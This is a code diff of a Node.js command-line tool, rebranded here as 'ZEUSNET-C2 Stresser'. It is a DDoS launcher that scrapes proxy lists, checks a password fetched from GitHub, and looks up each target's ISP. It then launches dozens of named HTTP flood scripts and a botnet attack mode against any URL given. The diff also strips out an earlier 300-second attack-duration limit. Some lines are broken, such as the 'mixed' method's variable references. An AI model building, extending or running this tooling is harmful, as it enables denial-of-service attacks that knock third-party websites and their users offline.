@@ -1,20 +1,27 @@
+#!/usr/bin/env node
+
 const { exec, spawn  } = require('child_process')
 const readline = require('readline')
 const url = require('url')
-const chalk = require('chalk');
-const gradient = require('gradient-string');
 const fs = require('fs')
-const dns = require('dns');
-const { promisify } = require('util');
-const table = require('cli-table3');
-const fetch = require('node-fetch');
-const whois = require('whois-json');
 const axios = require('axios')
 const path = require('path')
-const version = '1.0.0'
+const version = '1.0.0' 
 let processList = [];
+const cyan = '\x1b[96m';
+const bold = '\x1b[1m';
+const kuning_emas = '\x1b[93m';
+const Reset = '\x1b[0m';
+const biru = '\x1b[36m';
+const biru_terang = '\x1b[94m';
+const biru_tua = '\x1b[38;2;0;0;139m';
+const teksmerah = '\x1b[31m';
+const teksungu = '\x1b[95m';
+const hijau = '\x1b[38;2;144;238;144m';
+const orange = '\x1b[38;2;255;165;0m';
 
-const permen = readline.createInterface({
+
+const steven = readline.createInterface({
   input: process.stdin,
   output: process.stdout
 })
@@ -26,16 +33,27 @@ function sleep(ms) {
 async function banner() {
 console.clear()
 console.log(`
-\x1b[36m             RainC2
+${orange}Welcome User To ZEUSNET-C2 Tools${Reset}
+⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀ ${bold}${hijau}OWNER TOOLS: t.me/stevenstoree/@STEVENC2${Reset}
+⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀ ${bold}${biru_tua}USERNAME TOOLS: @STEVENC2${Reset}
+⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠉⠉⢉⣿⣿⣿⣷⣦⣄⡀⠀ ${bold}${biru}EXPIRED: NO EXPIRED${Reset}
+⠀⠚⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄ ${bold}${teksmerah}TIME LIMIT: NO LIMIT${Reset}
+⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⣿⡇ ${bold}${biru_terang}VIP: TRUE${Reset}
+⢀⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠈⠃ ${bold}${kuning_emas}COOLDOWN: 0${Reset}
+⠸⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠹⣿⣿⡇⠈⠻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠈⠻⡇⠀⠀⠈⠙⠿⣿⠀⠀⠀⠀
+${bold}${biru_terang}Type 'Help' For Showing All Fitur Command Tools ZEUSNET-C2${Reset} 
 `)}
-// [========================================] //
 async function scrapeProxy() {
   try {
     const response = await fetch('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt');
     const data = await response.text();
     fs.writeFileSync('proxy.txt', data, 'utf-8');
   } catch (error) {
-    console.error(`Error fetching data: ${error.message}`);
+    console.error(`Error Fetching Data: ${error.message}`);
   }
 }
 // [========================================] //
@@ -45,7 +63,7 @@ async function scrapeUserAgent() {
     const data = await response.text();
     fs.writeFileSync('ua.txt', data, 'utf-8');
   } catch (error) {
-    console.error(`Error fetching data: ${error.message}`);
+    console.error(`Error Fetching Data: ${error.message}`);
   }
 }
 // [========================================] //
@@ -65,64 +83,48 @@ async function bootup() {
   try {
     console.log(`|| ▓░░░░░░░░░ || 10%`);
     await exec(`npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-string pino mineflayer proxy-agent`)
-    console.log(`Despencies Is Installed 100%`);
-    const getLatestVersion = await fetch('https://raw.githubusercontent.com/wicaktzy/PSTeamDb/refs/heads/main/version.txt');
+    console.log(`|| ▓▓░░░░░░░░ || 20%`);
+    const getLatestVersion = await fetch('https://raw.githubusercontent.com/StevenBisnis22/cache/refs/heads/main/version.txt');
     const latestVersion = await getLatestVersion.text()
-    console.log(`Checking Version.. This Version Is ${version} `);
+    console.log(`|| ▓▓▓░░░░░░░ || 30%`);
     if (version === latestVersion.trim()) {
-    console.log(`Your Acces Is Allowed,Verification Is Valid`);
+    console.log(`|| ▓▓▓▓▓▓░░░░ || 60%`);
     
-    const secretBangetJir = await fetch('https://raw.githubusercontent.com/wicaktzy/cache/refs/heads/main/sigma.txt');
+    const secretBangetJir = await fetch('https://raw.githubusercontent.com/StevenBisnis22/cache/refs/heads/main/sigma.txt');
     const password = await secretBangetJir.text();
-    await console.log(`Input PassKey`)
-    permen.question('[\x1b[1m\x1b[31mSecurityPhase\x1b[0m]: \n', async (skibidi) => {
+    await console.log(`lovenet`)
+    steven.question('[\x1b[1m\x1b[31mPassword lovenet\x1b[0m]: \n', async (skibidi) => {
       if (skibidi === password.trim()) {
-        console.log(`Successfuly Login`)
+        console.log(`Password lovenet ZEUSNET-C2`)
         await scrapeProxy()
         console.log(`|| ▓▓▓▓▓▓▓░░░ || 70%`)
         await scrapeUserAgent()
         console.log(`|| ▓▓▓▓▓▓▓▓▓▓ || 100%`)
         await sleep(700)
         console.clear()
-        console.log(`Welcome To RainC2 Tools ${version}`)
+        console.log(`Welcome Guys To ZEUSNET-C2 Stresser Tools ${version}`)
         await sleep(1000)
 		    await banner()
-        console.log(`Type "help" For Showing All Available Command`)
+        console.log(`==========================================================================`)
         sigma()
       } else {
-        console.log(`Wrong Key`)
+        console.log(`lovenet`)
         process.exit(-1);
       }
     }) 
   } else {
-      console.log(`Fetching Data ${version} => ${latestVersion.trim()}`)
-      console.log(`Fetching Data Failed`)
+      console.log(`This Version Is Outdated. ${version} => ${latestVersion.trim()}`)
       await exec(`npm uninstall -g prmnmd-tuls`)
-      console.log(`Error ExitCode 0`)
       await exec(`npm i -g prmnmd-tuls`)
-      console.log(`Restart Tools Please`)
+      console.log(`Sedang Terkena Bug Harap Restart Ulang Tools ZEUSNET-C2`)
       process.exit()
     }
   } catch (error) {
-    console.log(`Are You Online?`)
+    console.log(`Apakah Anda Online?`)
   }
 }
-
-// [========================================] //
-async function getIPFromURL(host) {
-  return new Promise((resolve, reject) => {
-    const hostname = new URL(host).hostname;
-    dns.lookup(hostname, (err, address) => {
-      if (err) {
-        reject(`Error fetching IP for ${host}: ${err.message}`);
-      } else {
-        resolve(address);
-      }
-    });
-  });
-}
-
-async function pushMonitor(target, methods, duration) {
+// ====== //
+async function pushOngoing(target, methods, duration) {
   const startTime = Date.now();
   processList.push({ target, methods, startTime, duration })
   setTimeout(() => {
@@ -133,239 +135,198 @@ async function pushMonitor(target, methods, duration) {
   }, duration * 1000);
 }
 // [========================================] //
-function monitorAttack() {
-  console.log("\nMonitor Attack:\n");
+function ongoingAttack() {
+  console.log("\nOngoing Attack:\n");
   processList.forEach((process) => {
 console.log(`Target: ${process.target}
 Methods: ${process.methods}
 Duration: ${process.duration} Seconds
-Since: ${Math.floor((Date.now() - process.startTime) / 1000)} seconds ago\n`);
+Since: ${Math.floor((Date.now() - process.startTime) / 1000)} Seconds Ago\n`);
   });
 }
 // [========================================] //
 async function handleAttackCommand(args) {
-    if (args.length < 3) {
-        console.log(`Example usage: <methods> <url> <duration>`);
-        sigma();
-        return;
-    }
+  if (args.length < 3) {
+    console.log(`Example: Zeus-Tls <Target>  <Port> <Duration>
+Zeus-Tls https://google.com 433 120`);
+    sigma();
+	return
+  }
+const [target, port, duration] = args
+try {
+const parsing = new url.URL(target)
+const hostname = parsing.hostname
+const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
+const result = scrape.data;
 
-    const [target, duration, methods] = args;
-
-    if (parseInt(duration) > 300) {
-        console.log(chalk.red("Error: Duration cannot exceed 300 seconds!"));
-        sigma();
-        return;
-    }
-
-    try {
-        let hostname;
-        if (target.startsWith('http')) {
-            const parsing = new URL(target);
-            hostname = parsing.hostname;
-        } else {
-            hostname = target;
-        }
-
-        const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`);
-        const result = scrape.data;
-
-        console.clear();
-        console.log(`
-⣀⣀⣀⣠⣤⣤⣤⠤⡀        
-⣠⣤⣤⣤⡤\x1b[91m⢴⡶⠶⣤⣄\x1b[0m⣉⠙\x1b[0m⣦⡀⠀⠀   \x1b[31m- Powered by Custom Ubuntu -\x1b[0m
-⢨⣭⣭⡅\x1b[91m⣼⣿⣿⡇⠈⢻⣮⡑⣦\x1b[0m⡙\x1b[0m⢦⣄⡀    ⠀\x1b[47m \x1b[31m- Attacks Details -\x1b[0m
-⣄⢻⣿⣧\x1b[91m⠻⠿⠋ ⠛ ⢘⣿⢰\x1b[0m⣿⣦⡀⢍⣂  ⠀⠀Target   : [ \x1b[34m${target}\x1b[0m ]
-⠈⣃⡙⢿⣧\x1b[91m⣙⠶⣿⣿⡷⢘\x1b[0m⣡⣿⣿⣿⣿⣆⠹⠂⠀ ⠀Duration : [ \x1b[34m${duration}\x1b[0m ]
- ⠈⣳⡀⠉⠻⣿⣶⣶⡾⠿⠿⠿⠿⠛⠋⣉⡴   ⠀Methods  : [ \x1b[34m${methods}\x1b[0m ]
-\x1b[91m  ⣾⠃\x1b[0m⠈⠓⠦⠤⢀⣀⡒⠖⠉⠛⠛⠛⢯⠉ ⠀⠀⠀⠀  
-  \x1b[91m⣿\x1b[0m      \x1b[91m   ⢸⡇\x1b[0m       \x1b[47m \x1b[31m - Target Details - \x1b[0m
-\x1b[91m  ⣿ \x1b[0m    \x1b[91m    ⢸⡇\x1b[0m   ⠀  ⠀⠀AS       : [ \x1b[34m${result.as}\x1b[0m ]
-\x1b[91m  ⣿\x1b[0m        \x1b[91m  ⠃\x1b[0m       ⠀IP⠀      : [ \x1b[34m${result.query}\x1b[0m ]
- \x1b[91m ⠘\x1b[0m                  ⠀ISP      : [ \x1b[34m${result.isp}\x1b[0m ]
-⠀⠀  
-                      Project Made By [ \x1b[34m Gwyn/Stevee \x1b[0m ]
-                      YT [ \x1b[34m https://www.youtube.com/@steveeplayer \x1b[0m ]
-        `);
-    } catch (error) {
-        console.log(`Oops Something Went wrong`);
-    }
-
-    const metode = path.join(__dirname, `/lib/cache/${methods}`);
-
-if (methods === 'glory') {
-    pushMonitor(target, methods, duration);
-    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
-    sigma();
-} else if (methods === 'flood') {
-    pushMonitor(target, methods, duration);
-    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
-    sigma();
-} else if (methods === 'storm') {
-    pushMonitor(target, methods, duration);
-    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
-    sigma();
-} else if (methods === 'thunder') {
-    pushMonitor(target, methods, duration);
-    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
-    sigma();
-} else if (methods === 'bypass') {
-    pushMonitor(target, methods, duration);
-    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
-    sigma();
-} else if (methods === 'maklo') {
-    pushMonitor(target, methods, duration);
-    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
-    sigma();
-} else if (methods === 'https') {
-    pushMonitor(target, methods, duration);
-    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
-    sigma();
-} else if (methods === 'h2-raw') {
-    pushMonitor(target, methods, duration);
-    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
-    sigma();
-} else if (methods === 'cibi') {
-    pushMonitor(target, methods, duration);
-    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
-    sigma();
-} else if (methods === 'h2') {
-    pushMonitor(target, methods, duration);
-    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
-    sigma();
-} else if (methods === 'tls') {
-    pushMonitor(target, methods, duration);
-    exec(`node ${metode} ${target} ${duration} 100 10`);
-    sigma();
-} else if (methods === 'thspeed') {
-    pushMonitor(target, methods, duration);
-    exec(`node ${metode} ${target} 53 6 proxy.txt ${duration}`);
-    sigma(); 
-} else if (methods === 'cf') {
-    pushMonitor(target, methods, duration);
-    exec(`node ${metode} ${target} 53 6 proxy.txt ${duration}`);
-    sigma(); 
-} else if (methods === 'fire') {
-    pushMonitor(target, methods, duration);
-    exec(`node ${metode} ${target} 53 6 proxy.txt ${duration}`);
-    sigma(); 
-} else if (methods === 'httpx') {
-    pushMonitor(target, methods, duration);
-    exec(`node ${metode} ${target} 53 6 proxy.txt ${duration}`);
-    sigma(); 
-} else if (methods === 'ninja') {
-    pushMonitor(target, methods, duration);
-    exec(`node ${metode} ${target} 53 6 proxy.txt ${duration}`);
-    sigma(); 
-} else if (methods === 'pidoras') {
-    pushMonitor(target, methods, duration);
-    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
-    sigma();
-} else if (methods === 'xyn') {
-    pushMonitor(target, methods, duration);
-    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
-    sigma();
-} else if (methods === 'uam') {
-    pushMonitor(target, methods, duration);
-    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
-    sigma();
-} else if (methods === 'h2-meris') {
-    pushMonitor(target, methods, duration);
-    exec(`node ${metode} GET ${target} ${duration} 4 64 proxy.txt --query 1 --bfm true --httpver "http/1.1" --referer %RAND% --ua "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36" --ratelimit true`);
-    sigma();
-} else if (methods === 'blast') {
-    pushMonitor(target, methods, duration);
-    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
-    sigma();
-} else if (methods === 'raw') {
-    pushMonitor(target, methods, duration);
-    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
-    sigma();
-} else if (methods === 'h2-flood') {
-    pushMonitor(target, methods, duration);
-    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
-    sigma();
-} else if (methods === 'browser') {
-    pushMonitor(target, methods, duration);
-    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
-    sigma();
-} else if (methods === 'quantum') {
-    pushMonitor(target, methods, duration);
-    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
-    sigma();
-} else {
-    console.log(`Method ${methods} not recognized for Layer 7`);
+console.clear()
+console.log(`
+⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀
+⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠉⠉⢉⣿⣿⣿⣷⣦⣄⡀⠀
+⠀⠚⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
+⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⣿⡇
+⢀⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠈⠃
+⠸⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠹⣿⣿⡇⠈⠻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠈⠻⡇⠀⠀⠈⠙⠿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+${bold}${cyan}Attack Has Been Launched${Reset}
+========================================================================
+${bold}${cyan}STATUS${Reset}   : \x1b[94mAttack Has Successfully Launched\x1b[0m
+${bold}${cyan}Target${Reset}   : ${target}
+${bold}${cyan}Duration${Reset} : ${duration}
+${bold}${cyan}Methods${Reset}  : ${methods}
+${bold}${cyan}ISP${Reset}      : ${result.isp}
+${Reset}Ip${Reset}       : ${result.query}
+${bold}${cyan}AS${Reset}       : ${result.as}
+`)
+} catch (error) {
+  console.log(`Oops Something Went Wrong`)
 }
-}
-
-//====================== LAYER 4 CONTROLLER ==================
-async function handleAttackL4(args) {
-  if (args.length < 4) {
-    console.log(`Example: attackl4 <ip> <port> <duration> <method>`);
-    sigma();
-    return;
+const metode = path.join(__dirname, `/lib/cache/${methods}`);
+  if (methods === 'zeus-flood') {
+   pushOngoing(target, methods, duration)
+   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
+	sigma()
+ } else if (methods === 'zxm') {
+       pushOngoing(target, methods, duration)
+        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
+    sigma()
+ } else if (methods === 'ciko') {
+       pushOngoing(target, methods, duration)
+        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
+    sigma()
+ } else if (methods === 'zeus-love') {
+       pushOngoing(target, methods, duration)
+        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
+    sigma()
+ } else if (methods === 'glory') {
+       pushOngoing(target, methods, duration)
+        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
+    sigma()
+ } else if (methods === 'zeus-tls') {
+    pushOngoing(target, methods, duration)
+     exec(`node ${metode} ${target} ${duration} 100 10`)
+    sigma()
+  } else if (methods === 'xin') {
+       pushOngoing(target, methods, duration)
+        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
+    sigma()
+ } else if (methods === 'zs-browser') {
+       pushOngoing(target, methods, duration)
+        exec(`node ${metode} ${target} ${duration} 100 10`)
+    sigma()
+ } else if (methods === 'flayingraw') {
+       pushOngoing(target, methods, duration)
+        exec(`node ${metode} ${target} ${duration} 100 10`)
+    sigma()
+ } else if (methods === 'steven') {
+       pushOngoing(target, methods, duration)
+        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
+    sigma()
+ } else if (methods === 'zeus-steven') {
+       pushOngoing(target, methods, duration)
+        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
+   sigma()
+ } else if (methods === 'zeus-raw') {
+       pushOngoing(target, methods, duration)
+        exec(`node ${metode} ${target} ${duration}`)
+   sigma()
+ } else if (methods === 'black') {
+       pushOngoing(target, methods, duration)
+        exec(`node ${metode} ${target} ${duration} 100 10`)
+    sigma()
+ } else if (methods === 'zeus-flash') {
+       pushOngoing(target, methods, duration)
+        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
+   sigma()
+ } else if (methods === 'ciko') {
+       pushOngoing(target, methods, duration)
+        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
+    sigma()
+ } else if (methods === 'zs-bypass') {
+       pushOngoing(target, methods, duration)
+        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
+   sigma()
+ } else if (methods === 'flaybypass') {
+       pushOngoing(target, methods, duration)
+        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
+    sigma()
+ } else if (methods === 'sad') {
+      pushOngoing(target, methods, duration)
+       exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
+   sigma()
+ } else if (methods === 'ninja') {
+       pushOngoing(target, methods, duration)
+        exec(`node ${metode} ${target} ${duration} 100 10`)
+    sigma()
+ } else if (methods === 'flood1') {
+       pushOngoing(target, methods, duration)
+        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
+    sigma()
+ } else if (methods === 'zeus-sad') {
+       pushOngoing(target, methods, duration)
+        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
+    sigma()
+ } else if (methods === 'cici') {
+       pushOngoing(target, methods, duration)
+        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
+    sigma()
+ } else if (methods === 'cibi') {
+       pushOngoing(target, methods, duration)
+        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
+    sigma()
+ } else if (methods === 'chaptcha') {
+       pushOngoing(target, methods, duration)
+        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
+    sigma()
+ } else if (methods === 'cat') {
+       pushOngoing(target, methods, duration)
+        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
+    sigma()
+ } else if (methods === 'geckold') {
+       pushOngoing(target, methods, duration)
+        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
+    sigma()
+ } else if (methods === 'fire') {
+       pushOngoing(target, methods, duration)
+        exec(`node ${metode} ${target} ${duration} 100 10`)
+    sigma()
+ } else if (methods === 'mixed') {
+       pushOngoing(target, methods, duration)
+const zeus_flash = path.join(__dirname, `/lib/cache/zeus-flash.js`);
+const zs_bypass = path.join(__dirname, `/lib/cache/zs-bypass.js`);
+        exec(`node ${zeus-flash} ${target} ${duration} 100 10 proxy.txt`)
+        exec(`node ${zs-bypass} ${target} ${duration} 100 10 proxy.txt`)
+          sigma()
+          } else {
+    console.log(`Methods ${methods} Is Not Recognized In List ZEUSNET-C2.`);
   }
-
-  const [targetL4, port, durationL4, methodsL4] = args;
-
-  if (parseInt(durationL4) > 300) {
-    console.log(chalk.red("Error: Duration cannot exceed 300 seconds!"));
-    sigma();
-    return;
-  }
-
-  try {
-    let hostnameL4;
-    if (targetL4.startsWith('http')) {
-      const parsing = new URL(targetL4);
-      hostnameL4 = parsing.hostname;
-    } else {
-      hostnameL4 = targetL4;
-    }
-
-    const scrapeL4 = await axios.get(`http://ip-api.com/json/${hostnameL4}?fields=isp,query,as`);
-    const resultL4 = scrapeL4.data;
-
-    console.clear();
-    console.log(`
-⣀⣀⣀⣠⣤⣤⣤⠤⡀        
-⣠⣤⣤⣤⡤\x1b[91m⢴⡶⠶⣤⣄\x1b[0m⣉⠙\x1b[0m⣦⡀⠀⠀   \x1b[31m- Powered by Custom Ubuntu -\x1b[0m
-⢨⣭⣭⡅\x1b[91m⣼⣿⣿⡇⠈⢻⣮⡑⣦\x1b[0m⡙\x1b[0m⢦⣄⡀    ⠀\x1b[47m \x1b[31m- Attacks Details -\x1b[0m
-⣄⢻⣿⣧\x1b[91m⠻⠿⠋ ⠛ ⢘⣿⢰\x1b[0m⣿⣦⡀⢍⣂  ⠀⠀Target   : [ \x1b[34m${targetL4}\x1b[0m ]
-⠈⣃⡙⢿⣧\x1b[91m⣙⠶⣿⣿⡷⢘\x1b[0m⣡⣿⣿⣿⣿⣆⠹⠂⠀ ⠀Port     : [ \x1b[34m${port}\x1b[0m ]
- ⠈⣳⡀⠉⠻⣿⣶⣶⡾⠿⠿⠿⠿⠛⠋⣉⡴   ⠀Duration : [ \x1b[34m${durationL4}\x1b[0m ]
-\x1b[91m  ⣾⠃\x1b[0m⠈⠓⠦⠤⢀⣀⡒⠖⠉⠛⠛⠛⢯⠉ ⠀Methods  : [ \x1b[34m${methodsL4}\x1b[0m ]
-  \x1b[91m⣿\x1b[0m      \x1b[91m   ⢸⡇\x1b[0m       \x1b[47m \x1b[31m - Target Details - \x1b[0m
-\x1b[91m  ⣿ \x1b[0m    \x1b[91m    ⢸⡇\x1b[0m   ⠀  ⠀⠀AS       : [ \x1b[34m${resultL4.as}\x1b[0m ]
-\x1b[91m  ⣿\x1b[0m        \x1b[91m  ⠃\x1b[0m       ⠀IP⠀      : [ \x1b[34m${resultL4.query}\x1b[0m ]
- \x1b[91m ⠘\x1b[0m                  ⠀ISP      : [ \x1b[34m${resultL4.isp}\x1b[0m ]
-⠀⠀  
-                      Project Made By [ \x1b[34m Gwyn/Stevee \x1b[0m ]
-                      YT [ \x1b[34m https://www.youtube.com/@steveeplayer \x1b[0m ]
-`);
-  } catch (error) {
-    console.log(`Oops Something Went wrong`);
-  }
-
-  const metodeL4 = path.join(__dirname, `/lib/cache/${methodsL4}`);
-
-  //====================== LAYER 4 METHODS ====================
-  if (methodsL4 === 'udp') {
-    pushMonitor(targetL4, methodsL4, durationL4);
-    exec(`node ${metodeL4} ${targetL4} ${port} ${durationL4} 34`);
-    sigma();
-  } else if (methodsL4 === 'tcp') {
-    pushMonitor(targetL4, methodsL4, durationL4);
-    exec(`node ${metodeL4} ${targetL4} ${port} ${durationL4} 34`);
-    sigma();
-  } else {
-    console.log(`Method ${methodsL4} not recognized for Layer 4`);
-  }
-}
+};
 // [========================================] //
+function methods() {
+    
+    const methodsData = JSON.parse(fs.readFileSync('lib/methods.json', 'utf-8'));
+
+    console.log(`                          Methods`);
+    console.log(` NAME      │ DESCRIPTION                    │ DURATION`);
+    console.log(`───────────┼────────────────────────────────┼──────────`);
+
+    methodsData.forEach(method => {
+        console.log(
+            `${method.name.padEnd(10)} │ ${method.description.padEnd(30)} │ ${method.duration.padEnd(3)}`
+        );
+    });
+}
+
+// Logika Untuk Menjalankan Perintah
+const command = process.argv[2]; 
+// ===========================================//
 async function AttackBotnetEndpoints(args) {
     if (args.length < 3) {
-        console.log(`Example: attackbotnet <target> <duration> <methods>\nattackbotnet https://google.com 120 flood`);
+        console.log(`Example: Ddos <Target> <Duration> <Methods>\nDdos https://google.com 120 zeus-flood`);
         sigma();
         return;
     }
@@ -383,51 +344,51 @@ async function AttackBotnetEndpoints(args) {
         const endTime = startTime + duration * 1000;
         processList.push({ target, methods, startTime, duration, endTime, ip: result.query });
 
-        console.clear();
-        console.log(`
-⣀⣀⣀⣠⣤⣤⣤⠤⡀        
-⣠⣤⣤⣤⡤\x1b[35m⢴⡶⠶⣤⣄\x1b[0m⣉⠙\x1b[0m⣦⡀⠀⠀   \x1b[31m- Powered by Custom Ubuntu -\x1b[0m
-⢨⣭⣭⡅\x1b[34m⣼⣿⣿⡇⠈⢻⣮⡑⣦\x1b[0m⡙\x1b[0m⢦⣄⡀    ⠀\x1b[47m \x1b[31m- Attacks Details -\x1b[0m
-⣄⢻⣿⣧\x1b[36m⠻⠿⠋ ⠛ ⢘⣿⢰\x1b[0m⣿⣦⡀⢍⣂  ⠀⠀Target   : [ \x1b[34m${target}\x1b[0m ]
-⠈⣃⡙⢿⣧\x1b[91m⣙⠶⣿⣿⡷⢘\x1b[0m⣡⣿⣿⣿⣿⣆⠹⠂⠀ ⠀Duration : [ \x1b[34m${duration}\x1b[0m ]
- ⠈⣳⡀⠉⠻⣿⣶⣶⡾⠿⠿⠿⠿⠛⠋⣉⡴   ⠀Methods  : [ \x1b[34m${methods}\x1b[0m ]
-\x1b[91m  ⣾⠃\x1b[0m⠈⠓⠦⠤⢀⣀⡒⠖⠉⠛⠛⠛⢯⠉ ⠀⠀⠀⠀  
-  \x1b[91m⣿\x1b[0m      \x1b[91m   ⢸⡇\x1b[0m       \x1b[47m \x1b[31m - Target Details - \x1b[0m
-\x1b[91m  ⣿ \x1b[0m    \x1b[91m    ⢸⡇\x1b[0m   ⠀  ⠀⠀AS       : [ \x1b[34m${result.as}\x1b[0m ]
-\x1b[91m  ⣿\x1b[0m        \x1b[91m  ⠃\x1b[0m       ⠀IP⠀      : [ \x1b[34m${result.query}\x1b[0m ]
- \x1b[91m ⠘\x1b[0m                  ⠀ISP      : [ \x1b[34m${result.isp}\x1b[0m ]
-  \x1b[91m ⠘\x1b[0m                  ⠀BOTNET      : [ \x1b[34m${successCount}\x1b[0m ]
-⠀⠀  
-                      Project Made By [ \x1b[34m Gwyn/Stevee \x1b[0m ]
-                      YT [ \x1b[34m https://www.youtube.com/@steveeplayer \x1b[0m ]
-Please After Attack Type [\x1b[1m\x1b[35mcls\x1b[0m] To Return To The Home
+        console.clear()
+        console.log(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀
+⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠉⠉⢉⣿⣿⣿⣷⣦⣄⡀⠀
+⠀⠚⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
+⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⣿⡇
+⢀⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠈⠃
+⠸⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
